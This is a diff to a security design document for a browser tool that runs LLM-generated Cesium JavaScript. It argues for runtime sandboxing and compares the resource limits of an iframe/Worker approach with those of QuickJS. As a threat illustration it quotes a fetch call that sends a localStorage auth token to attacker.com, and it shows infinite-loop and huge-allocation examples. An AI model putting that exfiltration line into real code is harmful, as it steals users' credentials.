@@ -108,6 +108,42 @@ flowchart TB
 - **Stateless Per Session** — Session data is lost on refresh
 - **Authenticated** — User has auth tokens (cookies, localStorage)
 
+### Why sandbox isolation still matters even though the user writes the prompt
+
+A natural question: if the user is the only one who can be harmed, and the user chose to type
+the prompt, is runtime sandboxing (Gate 2) actually needed — or is server-side verification
+(Gate 1) enough, with the sandbox only mattering if the _service itself_ gets compromised?
+
+**Both are true, but the more common case is the first one, not the second.** The key point is
+that the user is responsible for their _prompt_ ("show me the Eiffel Tower"), not for the
+_code that executes_ — that code is synthesized by an LLM, and the user never reviews or
+approves it at the source level (only a natural-language description/approval gate, not a code
+diff). So the sandbox is defending against everything that can go wrong **between** an
+innocent, self-directed prompt and the code that ultimately runs, independent of whether
+anyone malicious is involved:
+
+1. **LLM unreliability, not malice** (Attack #3/#4 below) — a completely benign prompt can still
+   produce code that misuses a Cesium API, hallucinates a call, or hits an edge case Gate 1's
+   static AST walk doesn't model (it's parse-only; it cannot reason about semantics). This is the
+   dominant real-world case observed in this repo's own testing — none of
+   those were adversarial, all were ordinary generation variance that only a runtime boundary
+   (sandbox timeout, memory cap, blocked properties, opaque handles) contained safely.
+2. **A compromised or MITM'd service** (Attack #1/#7) — if the backend or transport is
+   compromised, arbitrary attacker-authored JS can reach the browser. Here the sandbox is the
+   _only_ thing standing between that code and `window`/`document`/`localStorage`/`fetch`, since
+   Gate 1 runs server-side and can be skipped entirely by a compromised server.
+3. **Gate 1 bypass/bug** (Attack #4) — even with an honest server and honest LLM, the static
+   verifier itself can have a logic gap (computed access trick, missed global, prototype
+   pollution). The sandbox is the safety net for exactly this failure mode.
+4. **Accidental resource exhaustion** (Attack #5) — an infinite loop or entity spam doesn't
+   require any malicious intent at all, just an unlucky generation; only runtime timeout/memory/
+   entity caps stop it, since none of that is visible to a static parse.
+
+In short: "the user is responsible for the prompt" only fully removes the need for a sandbox if
+you also assume the LLM never misbehaves, the server/transport are never compromised, and Gate 1
+never has a bug. Since none of those three are guaranteed, the sandbox exists to contain the
+_output_ of an untrusted generation step — not to distrust the user themselves.
+
 ---
 
 ## 2. Attack Vectors
@@ -262,11 +298,14 @@ fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
    Note: `fetch` (and every network global) is banned **outright**, not merely restricted to a
    domain allowlist — there is no per-domain fetch allowlist in the codegen tool.
 2. **Allowlist-Based Validation** — The verifier supports an optional `allowedSymbols`
-   free-identifier allowlist. Currently, `generateVerifiedCesiumCode`
-   calls `verifyCesiumCode(code)` without passing `allowedSymbols`, so free-identifier allowlisting
-   is not enabled: any identifier that is not a banned global is permitted. The safety net is the
-   banned-global denylist plus downstream sandbox containment. For defense in depth, a caller can
-   pass its own allowed-symbols list to `verifyCesiumCode`:
+   free-identifier allowlist, threaded through end-to-end: `generateVerifiedCesiumCode` accepts
+   `allowedSymbols` (along with `maxLength`/`maxLines`) and passes it to `verifyCesiumCode`, and the
+   sample backend's `createExecuteCesiumCodeTool` wires it from the `CODEGEN_ALLOWED_SYMBOLS`
+   (comma-separated), `CODEGEN_MAX_CODE_LENGTH`, and `CODEGEN_MAX_CODE_LINES` env vars (see
+   `.env.example`). By default these are left unset, so allowlisting is opt-in: any identifier that
+   is not a banned global is permitted. The safety net is the banned-global denylist plus
+   downstream sandbox containment. For defense in depth, a caller can pass its own allowed-symbols
+   list directly to `verifyCesiumCode`:
 
    ```typescript
    const result = verifyCesiumCode(code, { allowedSymbols: myOwnAllowedSymbolsList });
@@ -569,6 +608,48 @@ Generated Code → Browser Global Scope → Direct Access to viewer, window, doc
 - HTTPS + SRI for transport security
 - CSP headers to block external fetch
 
+#### Isn't "just refresh the page" enough recovery from a crash?
+
+A reasonable objection to sandboxing: if generated code crashes/hangs the tab, can't the user
+just reload and move on — is the added complexity of a sandbox actually worth it? Refresh is a
+fine recovery for the _availability_ symptom (frozen/crashed tab), but it doesn't address most of
+what the sandbox is actually for, for four reasons:
+
+1. **Refresh doesn't undo confidentiality damage that already happened.** If the code executed
+   `fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))` (Attack #1/#3),
+   that request is already sent by the time anything crashes or the user notices something is
+   wrong. Refreshing the tab afterward doesn't un-send it. The sandbox's value here is
+   _preventive_ (no access to `fetch`/`localStorage`/`document` in the first place), not
+   _recovery-oriented_ — a clean reload after the fact is irrelevant to this class of attack.
+2. **A synchronous infinite loop can make "just refresh" not actually work.** In Option A, generated
+   code runs directly on the page's own main thread. A `while (true) {}` (Attack #5) blocks that
+   thread completely — the tab becomes unresponsive to clicks/keyboard input, including the
+   refresh shortcut, until the browser's own "page unresponsive" watchdog kicks in (timing varies
+   by browser, and some browsers give the option to keep waiting). The user isn't guaranteed a
+   quick, easy refresh; they may need the OS task manager to kill the process. A sandbox that runs
+   on a separate thread/process (Worker, cross-origin iframe, or a stepped interpreter like
+   QuickJS) is what makes a _reliable, external_ timeout interrupt possible at all — refreshing is
+   a fallback for when containment fails, not a substitute for having it.
+3. **Refresh throws away everything, not just the bad effect.** A reload loses the entire session:
+   every entity/primitive/data source added so far, camera state, and conversation context. The
+   app's actual design goal (see the `continueConversation` feedback loop in
+   `packages/chat-element`/`frontend/src/tools/execute-cesium-code.ts`, and the render-loop
+   self-heal via `waitForRenderError`/`useDefaultRenderLoop` in this repo) is for a single bad tool
+   call to fail gracefully and let the model see the error and retry _in the same session_ — not
+   for the user to lose their whole working state every time one generation goes wrong. That
+   graceful-degradation UX is only possible because the sandbox contains the failure to one call
+   instead of taking down the page.
+4. **It only covers the honest-mistake case, not the adversarial ones.** "Refresh and move on" is a
+   reasonable posture for Attack #5 (accidental resource exhaustion) alone. It does nothing for
+   Attack #1 (MITM-modified response), #4 (Gate 1 bypass), or #7 (compromised
+   server/dependency) — in all three, the generated code is attacker-authored, and the goal is to
+   stop it from ever reaching `window`/`document`/`localStorage`/network, not to clean up after it.
+
+So refresh is a legitimate _fallback_ for the crash/hang symptom, but it's not a substitute for
+sandboxing: it can't undo data already exfiltrated, isn't guaranteed to be actionable if the main
+thread is truly blocked, discards good session state along with the bad, and does nothing for
+attacker-controlled (rather than merely buggy) generated code.
+
 ---
 
 ### Option B: Sandboxed Execution Environment
@@ -619,6 +700,10 @@ Generated Code → Execution Sandbox → Controlled Bridge → viewer (proxied)
 
 ### Option C: iframe Sandbox
 
+> For a deeper architecture comparison of this option against the current QuickJS executor and a
+> third "disposable in-iframe Viewer" variant (with an advantages/disadvantages/when-to-use table),
+> see [Codegen-execution-sandbox-options.md](Codegen-execution-sandbox-options.md).
+
 **Architecture:**
 
 ```
@@ -666,6 +751,49 @@ Generated Code → iframe with sandbox attribute
 | `allow-same-origin`      | Allow same-origin access (use with caution) |
 | `allow-forms`            | Allow form submission                       |
 | Empty (most restrictive) | No scripts, forms, popups, plugins          |
+
+#### Can additional rules give the iframe approach timeout/memory limits?
+
+Partially — but the mechanism is fundamentally different from QuickJS's, and weaker. There is no
+browser API that lets a parent page cap how much heap or CPU an iframe's script is allowed to
+consume _before the fact_. What's achievable is a **reactive watchdog**, not a **preventive cap**:
+
+- **Timeout (achievable, with a caveat):**
+  - Run the generated code inside a **`Worker` created from within the sandboxed iframe**
+    (rather than directly in the iframe's own document/main thread). A `Worker` gives a real,
+    well-defined hard-kill primitive — `worker.terminate()` — that immediately stops execution,
+    including a synchronous `while (true) {}`, at any point, with no cooperation required from the
+    running code.
+  - Pattern: start a timer when the code is dispatched to the worker; if no "done" `postMessage`
+    arrives within e.g. 5000ms, call `worker.terminate()` (and treat it as a timeout error).
+  - **Caveat if the code instead runs directly in the iframe's own script context (no inner
+    Worker):** a synchronous infinite loop cannot be interrupted from outside at all short of
+    destroying the iframe itself (`iframe.remove()` / `iframe.src = "about:blank"`). Cross-origin
+    iframes get their own renderer process under site isolation (Chrome/Firefox/Safari all do
+    this today), so a hung loop only pins _that_ process, not the parent tab — but the parent
+    still can't resume it or partially execute more code afterward; the whole realm is gone and
+    must be recreated from scratch for the next run.
+- **Memory (weak at best):** there is no standard API to set a hard heap ceiling on a
+  worker/iframe the way `quickjs-emscripten`'s `runtime.setMemoryLimit()` does (which makes the
+  _interpreter itself_ refuse an allocation and throw a catchable guest-side error). The closest
+  approximations are monitoring, not capping:
+  - `performance.memory` (Chrome-only, non-standard, coarse, main-thread-oriented)
+  - `performance.measureUserAgentSpecificMemory()` (Chrome, requires cross-origin-isolation via
+    COOP/COEP) — closer to a real per-context memory readout, but async/coarse-grained and still
+    only lets you _detect and then kill_ after the fact, not prevent the allocation from
+    succeeding in the first place. A single large synchronous allocation (`new Array(1e9)`) can
+    still crash/hang the process before a periodic check ever runs.
+  - So in practice, the only reliable memory mitigation for the iframe/Worker approach is the
+    same reactive pattern as timeout: a heartbeat/liveness check with `worker.terminate()` (or
+    iframe teardown) as the circuit breaker if the guest goes quiet or an OOM/crash is observed —
+    not a guarantee that a single runaway allocation can't happen at all.
+
+**Bottom line:** adding a Worker-inside-sandboxed-iframe + watchdog/heartbeat pattern meaningfully
+closes the timeout gap (a real hard-kill exists), but only narrows, not closes, the memory gap
+(detection-and-kill after the fact, vs. QuickJS's enforced heap ceiling that refuses the
+allocation before it happens). This is why Option D (Hybrid) still lists QuickJS/interpreter-level
+sandboxing as the reference approach when a hard resource guarantee is required, and treats the
+iframe route as an acceptable alternative only when "best-effort, detect-then-kill" is sufficient.
 
 #### Real-world example: Cesium Sandcastle Copilot
 
@@ -820,6 +948,7 @@ if (!result.success) {
 
 ## References
 
+- [Codegen execution sandbox options](Codegen-execution-sandbox-options.md)
 - [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
 - [MDN: Sandbox Attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox)
 - [CSP Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
